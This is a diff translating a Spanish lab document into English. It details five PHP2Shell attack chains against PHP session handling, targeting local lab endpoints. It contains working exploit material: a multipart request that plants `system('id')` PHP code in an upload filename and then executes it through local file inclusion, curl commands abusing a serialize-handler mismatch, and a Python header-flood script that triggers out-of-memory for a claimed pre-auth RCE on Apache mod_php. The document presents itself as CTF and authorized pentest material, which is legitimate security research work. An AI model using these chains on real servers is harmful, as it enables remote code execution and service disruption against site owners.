@@ -1,51 +1,51 @@
-# Cadenas de ataque PHP2Shell — Detalle técnico
+# PHP2Shell attack chains — Technical detail
 
-Este documento describe las **cinco cadenas de ataque** (A, B, C, D, E) documentadas en la investigación PHP2Shell, con foco en las tres reproducibles en este lab.
+This document describes the **five attack chains** (A, B, C, D, E) documented in the PHP2Shell research, focusing on the three reproducible in this lab.
 
 ---
 
 ## Chain A — Session File Injection + LFI → RCE
 
-**Precondiciones:**
+**Preconditions:**
 - `session.upload_progress.enabled = On` (default)
-- `session.upload_progress.cleanup = Off` (el lab lo tiene Off; el default de PHP es On)
+- `session.upload_progress.cleanup = Off` (the lab has it Off; the PHP default is On)
 - `session.use_strict_mode = Off` (default)
-- **Aplicación con LFI** (local file inclusion)
+- **Application with LFI** (local file inclusion)
 
-**Superficie:** PHP-FPM o Apache mod_php.
+**Surface:** PHP-FPM or Apache mod_php.
 
-**Mecánica del ataque:**
+**Attack mechanics:**
 
-1. **Session fixation:** como `use_only_cookies=0` (default), el `PHPSESSID` se puede fijar enviándolo en el **cuerpo multipart** además de en la cookie:
+1. **Session fixation:** because `use_only_cookies=0` (default), `PHPSESSID` can be fixed by sending it in the **multipart body** in addition to the cookie:
    ```
    Content-Disposition: form-data; name="PHPSESSID"
    
    ctfchainA000000000000000000
    ```
 
-2. **Disparar el handler `upload_progress`:** la petición multipart debe incluir:
-   - Un campo con `name="PHP_SESSION_UPLOAD_PROGRESS"` (el `session.upload_progress.name` por defecto) con cualquier valor (ej. `x`).
-   - Un campo tipo `file` con `filename="<payload>"`. El **filename** es lo que se escribe CRUDO en el fichero de sesión.
+2. **Trigger the `upload_progress` handler:** the multipart request must include:
+   - A field with `name="PHP_SESSION_UPLOAD_PROGRESS"` (the default `session.upload_progress.name`) with any value (e.g. `x`).
+   - A `file` field with `filename="<payload>"`. The **filename** is what is written RAW into the session file.
 
-3. **Inyección del payload PHP en el filename:**
+3. **Inject the PHP payload into the filename:**
    ```
    Content-Disposition: form-data; name="f"; filename="<?php system('id'); ?>"
    ```
-   Como `cleanup=Off`, el fichero `sess_<SID>` persiste tras la petición con el código PHP dentro (sin sanitizar).
+   Because `cleanup=Off`, the `sess_<SID>` file persists after the request with the PHP code inside (unsanitized).
 
-4. **LFI → ejecución:** el endpoint vulnerable de LFI (`vuln.php?page=...`) hace `include($_GET['page'])` sin sanitizar. Incluye el fichero de sesión:
+4. **LFI → execution:** the vulnerable LFI endpoint (`vuln.php?page=...`) performs `include($_GET['page'])` without sanitization. Include the session file:
    ```
    GET /vuln.php?page=/tmp/sessions/sess_ctfchainA000000000000000000
    ```
-   Al incluirse, el código PHP del filename se ejecuta.
+   When included, the PHP code from the filename executes.
 
-**Ejemplo de petición completa (Chain A):**
+**Full example request (Chain A):**
 
 ```http
 POST /index.php HTTP/1.1
 Host: 127.0.0.1:18080
 Content-Type: multipart/form-data; boundary=EXPLOIT
-Cookie: PHPSESSID=ctfchainA000000000000000000
+Cookie: ***
 
 --EXPLOIT
 Content-Disposition: form-data; name="PHPSESSID"
@@ -62,103 +62,103 @@ dummy
 --EXPLOIT--
 ```
 
-Luego:
+Then:
 ```http
 GET /vuln.php?page=/tmp/sessions/sess_ctfchainA000000000000000000&c=id HTTP/1.1
 ```
 
-**Fiabilidad:** 100% si la app tiene LFI.
+**Reliability:** 100% if the app has LFI.
 
 ---
 
 ## Chain B — `var_destroy` UAF → Handler Overwrite → RCE
 
-**Precondiciones:**
-- Aplicación llama `unserialize()` con data controlada.
-- Gadget destructor disponible (clase con `__destruct`).
+**Preconditions:**
+- Application calls `unserialize()` with controlled data.
+- Destructor gadget available (a class with `__destruct`).
 
-**Superficie:** cualquier SAPI (FPM, mod_php, CLI).
+**Surface:** any SAPI (FPM, mod_php, CLI).
 
-**Mecánica del ataque:**
+**Attack mechanics:**
 
-`var_destroy()` libera chunks de back-reference y luego dispara `__destruct` **sin** `serialize_lock`. Un `unserialize()` anidado dentro del destructor reutiliza el `var_hash` liberado → **heap-use-after-free** → sobrescritura de function handler → RCE.
+`var_destroy()` frees back-reference chunks and then triggers `__destruct` **without** `serialize_lock`. A nested `unserialize()` inside the destructor reuses the freed `var_hash` → **heap-use-after-free** → function handler overwrite → RCE.
 
-**Verificación:** PoC `verify_uaf_asan.php` del repo oficial, ejecutado localmente con PHP compilado con ASAN:
+**Verification:** PoC `verify_uaf_asan.php` from the official repo, run locally with an ASAN-compiled PHP:
 ```bash
 USE_ZEND_ALLOC=0 ASAN_OPTIONS="detect_leaks=0" php verify_uaf_asan.php
 ```
 
-**Este lab NO incluye un endpoint `unserialize()` controlado** porque Chain B es más demo de gadget que de superficie web. Se puede añadir manualmente si se desea probar.
+**This lab does NOT include a controlled `unserialize()` endpoint** because Chain B is more of a gadget demo than a web surface. It can be added manually if desired.
 
-**Confirmación ASAN:** `heap-use-after-free` en `var_unserializer.c:851`.
+**ASAN confirmation:** `heap-use-after-free` at `var_unserializer.c:851`.
 
 ---
 
 ## Chain C — Session Handler Mismatch → `__destruct` → RCE
 
-**Precondiciones:**
-- Dos directorios con diferentes `session.serialize_handler`:
-  - Directorio escritura: `php_serialize` (preserva pipe `|` en strings).
-  - Directorio lectura: `php` (interpreta `|` como separador de campos).
-- Save path compartido (`session.save_path` apunta al mismo directorio).
+**Preconditions:**
+- Two directories with different `session.serialize_handler`:
+  - Write directory: `php_serialize` (preserves the pipe `|` in strings).
+  - Read directory: `php` (interprets `|` as a field separator).
+- Shared save path (`session.save_path` points to the same directory).
 
-**Superficie:** PHP-FPM con soporte `.user.ini` (el PHP built-in server NO soporta `.user.ini`; este lab usa nginx → php-fpm).
+**Surface:** PHP-FPM with `.user.ini` support (the PHP built-in server does NOT support `.user.ini`; this lab uses nginx → php-fpm).
 
-**Mecánica del ataque:**
+**Attack mechanics:**
 
-1. **Escritura con `php_serialize`:** POST a `/app/upload.php` (que tiene `.user.ini` con `session.serialize_handler = php_serialize`). El filename con pipe y objeto serializado se escribe tal cual:
+1. **Write with `php_serialize`:** POST to `/app/upload.php` (which has a `.user.ini` with `session.serialize_handler = php_serialize`). The filename with the pipe and the serialized object is written as-is:
    ```
    filename="x|O:8:\"stdClass\":0:{}"
    ```
-   Fichero sesión resultante (serializado con `php_serialize`):
+   Resulting session file (serialized with `php_serialize`):
    ```
    a:1:{s:10:"upload_progress_x";a:5:{...s:4:"name";s:22:"x|O:8:\"stdClass\":0:{}"...}}
    ```
 
-2. **Lectura con `php`:** GET/POST a `/api/endpoint.php` (que tiene `.user.ini` con `session.serialize_handler = php`). Al deserializar, el handler `php` **split** en el primer `|` → trata `O:8:\"stdClass\":0:{}` como un objeto serializado → instancia `stdClass` → dispara `__destruct` durante cleanup del `var_hash` **incluso cuando el decode retorna FAILURE**.
+2. **Read with `php`:** GET/POST to `/api/endpoint.php` (which has a `.user.ini` with `session.serialize_handler = php`). When deserializing, the `php` handler **splits** at the first `|` → treats `O:8:\"stdClass\":0:{}` as a serialized object → instantiates `stdClass` → triggers `__destruct` during `var_hash` cleanup **even when decoding returns FAILURE**.
 
-**Hallazgo clave de la investigación:** `__destruct` se dispara en **ambos** paths (success y failure) durante la limpieza del var_hash tras el parse.
+**Key research finding:** `__destruct` fires on **both** paths (success and failure) during var_hash cleanup after parsing.
 
-**Ejemplo de petición (Chain C):**
+**Example request (Chain C):**
 
 ```bash
-# Escritura (php_serialize)
+# Write (php_serialize)
 curl -X POST \
-  -H "Cookie: PHPSESSID=chainC00000000000000000000" \
+  -H "Cookie: ***" \
   -F "PHPSESSID=chainC00000000000000000000" \
   -F "PHP_SESSION_UPLOAD_PROGRESS=x" \
   -F 'f=@-;filename="x|O:8:\"stdClass\":0:{}"' \
   http://127.0.0.1:18080/app/upload.php <<< "dummy"
 
-# Lectura (php handler deserializa y dispara __destruct)
-curl -H "Cookie: PHPSESSID=chainC00000000000000000000" \
+# Read (the php handler deserializes and triggers __destruct)
+curl -H "Cookie: ***" \
   http://127.0.0.1:18080/api/endpoint.php
 ```
 
-**Verificación:** inspeccionar logs de PHP buscando warnings de decode failure (si `display_errors=On`), o rastrear `__destruct` con un gadget real.
+**Verification:** inspect PHP logs for decode-failure warnings (if `display_errors=On`), or trace `__destruct` with a real gadget.
 
 ---
 
 ## Chain D — mod_php OOM → Stale `EG()` → RCE ⚡
 
-**Precondiciones:** **NINGUNA** (0-day sin dependencias de app).
+**Preconditions:** **NONE** (0-day with no application dependencies).
 
-**Superficie:** **Apache mod_php exclusivamente** (no FPM, no CLI).
+**Surface:** **Apache mod_php only** (not FPM, not CLI).
 
-**Severidad crítica:** RCE pre-autenticación contra **cualquier** endpoint PHP en Apache mod_php.
+**Critical severity:** pre-authentication RCE against **any** PHP endpoint on Apache mod_php.
 
-**Mecánica del ataque:**
+**Attack mechanics:**
 
-1. **Disparar OOM durante request startup:** enviar POST con headers masivos o body enorme que dispare `zend_mm` OOM durante `php_request_startup` → `longjmp()` salta el initialization → Apache mod_php **NO mata el proceso** (a diferencia de FPM que mata el worker).
+1. **Trigger OOM during request startup:** send a POST with massive headers or a huge body that triggers a `zend_mm` OOM during `php_request_startup` → `longjmp()` skips initialization → Apache mod_php **does not kill the process** (unlike FPM, which kills the worker).
 
-2. **Stale executor globals:** el proceso Apache reutiliza el executor con `EG()` globals corruptos (no inicializados por el `longjmp`). La siguiente request hereda ese estado → UAF en shutdown paths → RCE.
+2. **Stale executor globals:** the Apache process reuses the executor with corrupt `EG()` globals (not initialized because of the `longjmp`). The next request inherits that state → UAF in shutdown paths → RCE.
 
-**Estrategias de OOM:**
+**OOM strategies:**
 
-- **Headers masivos:** enviar miles de headers `X-Custom-N: <padding>` hasta saturar memoria antes del body parse.
-- **POST body enorme:** `Content-Length` > `memory_limit` con body que dispare OOM en el parse multipart.
+- **Massive headers:** send thousands of `X-Custom-N: <padding>` headers to exhaust memory before body parsing.
+- **Huge POST body:** `Content-Length` > `memory_limit` with a body that triggers OOM during multipart parsing.
 
-**Ejemplo (headers masivos):**
+**Example (massive headers):**
 
 ```python
 import socket
@@ -166,7 +166,7 @@ import socket
 def oom_headers(host, port, path):
     sock = socket.create_connection((host, port), timeout=15)
     req = f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
-    # 100k headers de 1KB cada uno → ~100MB
+    # 100k headers of 1 KB each → ~100MB
     for i in range(100000):
         req += f"X-Custom-{i}: {'A'*1000}\r\n"
     req += "\r\n"
@@ -176,49 +176,49 @@ def oom_headers(host, port, path):
 oom_headers("127.0.0.1", 18081, "/index.php")
 ```
 
-**SAPI afectados:**
-- Apache mod_php ✅ (confirmado)
-- FPM ⚠️ (worker exit, no persiste el estado sucio)
-- FrankenPHP ✅ (confirmado en la investigación)
+**Affected SAPIs:**
+- Apache mod_php ✅ (confirmed)
+- FPM ⚠️ (worker exit, dirty state does not persist)
+- FrankenPHP ✅ (confirmed in the research)
 
-**Este lab expone Chain D en `127.0.0.1:18081` (Apache mod_php con `memory_limit=32M`).**
+**This lab exposes Chain D at `127.0.0.1:18081` (Apache mod_php with `memory_limit=32M`).**
 
-**PoC oficial:** `verify_oom_trigger.py` del repo `ikow/php2shell-poc`.
+**Official PoC:** `verify_oom_trigger.py` from the `ikow/php2shell-poc` repo.
 
 ---
 
 ## Chain E — FPM Session OOM → Stale `BG(unserialize)` → RCE ⚡
 
-**Precondiciones:**
-- Endpoint con `session_start()` que lea sesión grande (~30MB).
-- PHP-FPM (no mod_php).
+**Preconditions:**
+- Endpoint with `session_start()` that reads a large session (~30MB).
+- PHP-FPM (not mod_php).
 
-**Superficie:** PHP-FPM exclusivamente.
+**Surface:** PHP-FPM only.
 
-**Mecánica del ataque:**
+**Attack mechanics:**
 
-1. **Producer request:** `session_start()` decodifica sesión ~30MB → OOM durante `php_var_unserialize` → `BG(unserialize).level` queda >0, estado de destrucción sucio → FPM worker **sobrevive** (a diferencia del comportamiento de FPM en Chain D, aquí el OOM es durante una fase distinta y el worker no muere).
+1. **Producer request:** `session_start()` decodes a ~30MB session → OOM during `php_var_unserialize` → `BG(unserialize).level` remains >0, dirty destruction state → the FPM worker **survives** (unlike FPM behavior in Chain D, here the OOM occurs in a different phase and the worker does not die).
 
-2. **Consumer request:** disparar `upload_progress` → el handler `rfc1867` (que corre **antes** de `PHP_RINIT_FUNCTION(basic)`) accede al `BG(unserialize)` stale → "Session object destruction failed" → `__destruct` en objetos stale → UAF → RCE.
+2. **Consumer request:** trigger `upload_progress` → the `rfc1867` handler (which runs **before** `PHP_RINIT_FUNCTION(basic)`) accesses the stale `BG(unserialize)` → "Session object destruction failed" → `__destruct` on stale objects → UAF → RCE.
 
-**Hallazgo clave:** `rfc1867` corre ANTES del `basic_rinit`, así que el `BG(unserialize)` stale es accesible.
+**Key finding:** `rfc1867` runs BEFORE `basic_rinit`, so the stale `BG(unserialize)` is accessible.
 
-**Verificación:** "Session object destruction failed" en logs durante PHP Request Startup.
+**Verification:** "Session object destruction failed" in logs during PHP Request Startup.
 
-**PoC oficial:** `verify_fpm_stale_state.py`.
+**Official PoC:** `verify_fpm_stale_state.py`.
 
-**Este lab expone FPM en `:18080` / `:9000`, pero NO incluye un endpoint con sesión grande pre-poblada.** Se puede crear manualmente si se desea probar Chain E.
+**This lab exposes FPM on `:18080` / `:9000`, but does NOT include an endpoint with a large pre-populated session.** It can be created manually if you want to test Chain E.
 
 ---
 
-## Resumen de chains por endpoint del lab
+## Lab endpoint chain summary
 
-| Chain | Endpoint(s) del lab                  | Reproducible OOTB | Notas                                   |
-|-------|--------------------------------------|-------------------|-----------------------------------------|
-| A     | `:18080/vuln.php` + `:18080/index.php` | ✅ Sí              | LFI + upload_progress, listo para usar  |
-| B     | (ninguno)                            | ❌ No             | Requiere endpoint `unserialize()` + gadget |
-| C     | `:18080/app/` y `:18080/api/`        | ✅ Sí              | Handler mismatch vía `.user.ini`        |
-| D     | `:18081/index.php` (Apache mod_php)  | ✅ Sí              | OOM mod_php con `memory_limit=32M`      |
-| E     | `:18080` (FPM)                       | ⚠️ Parcial        | Requiere sesión grande pre-poblada      |
+| Chain | Lab endpoint(s)                       | Reproducible OOTB | Notes                                      |
+|-------|---------------------------------------|-------------------|--------------------------------------------|
+| A     | `:18080/vuln.php` + `:18080/index.php` | ✅ Yes            | LFI + upload_progress, ready to use        |
+| B     | (none)                                | ❌ No             | Requires `unserialize()` endpoint + gadget |
+| C     | `:18080/app/` and `:18080/api/`       | ✅ Yes            | Handler mismatch via `.user.ini`           |
+| D     | `:18081/index.php` (Apache mod_php)   | ✅ Yes            | mod_php OOM with `memory_limit=32M`        |
+| E     | `:18080` (FPM)                        | ⚠️ Partial        | Requires a large pre-populated session     |
 
-**Para uso en CTF/pentesting local autorizado.**
+**For use in an authorized local CTF/pentest.**
